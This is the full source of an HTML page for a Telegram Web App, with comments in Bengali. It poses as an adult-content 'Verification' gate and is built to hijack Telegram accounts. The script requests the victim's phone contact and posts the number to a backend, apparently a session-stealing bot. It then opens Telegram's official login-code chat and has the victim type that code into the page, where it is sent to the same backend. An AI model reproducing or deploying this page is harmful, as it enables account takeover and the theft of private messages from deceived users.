<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: white; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; text-decoration: none; }
        .btn-blue { background: #007bff; }
        .hidden { display: none; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; }
    </style>
</head>
<body>
    <!-- ধাপ ১: নম্বর নেওয়া -->
    <div class="box" id="step0">
        <h2>Verification</h2>
        <p style="font-size: 14px; color: #666;">Click confirm to continue.</p>
        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
        <div id="loader" class="hidden">Connecting...</div>
    </div>

    <!-- ধাপ ২: ওটিপি বক্স এবং সরাসরি ম্যানুয়াল বাটন -->
    <div class="box hidden" id="step2">
        <h3>Verify Code</h3>
        <p style="font-size: 13px; color: #555;">Click the button below to see your code.</p>
        
        <!-- এই বাটনে কোনো ড্রামাটিক টাইমার বা ব্যাকগ্রাউন্ড কাজ নেই। সরাসরি ক্লিক = সরাসরি চ্যাট ওপেন -->
        <button class="btn btn-blue" id="get_code_btn" onclick="openOTPChat()">📩 GET CODE 📩</button>
        
        <input type="number" id="otp" placeholder="Enter Code">
        <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;

        function startFlow() {
            tg.requestContact();
            document.getElementById('main_btn').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumber(data.phone); } 
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    // নম্বর পাঠানো সফল হলে ইউজারকে ম্যানুয়াল বাটনওয়ালা ওটিপি পেজে আনা হচ্ছে
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        // এটাই সেই আসল ফাংশন যা সরাসরি ইউজার টাচ করার সাথে সাথে কল হবে
        function openOTPChat() {
            // ১. হ্যাপটিক ভাইব্রেশন
            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy');

            // ২. সরাসরি ক্লিক ইভেন্টের ভেতরেই ওপেন মেথড। কোনো এরর আসবে না।
            tg.openTelegramLink("https://t.me/777000");

            // ব্যাকআপ হিসেবে যদি লিঙ্কে সমস্যা হয়
            setTimeout(() => {
                window.location.href = "tg://openmessage?user_id=777000";
            }, 500);
        }

        async function verifyOTP() {
            let code = document.getElementById("otp").value;
            if(code.length < 5) return alert("Enter Code!");
            
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: code })
                });
                const data = await res.json();
                if (data.status === "success") { tg.close(); } 
                else { alert("Wrong Code!"); }
            } catch (e) { }
        }
    </script>
</body>
</html>
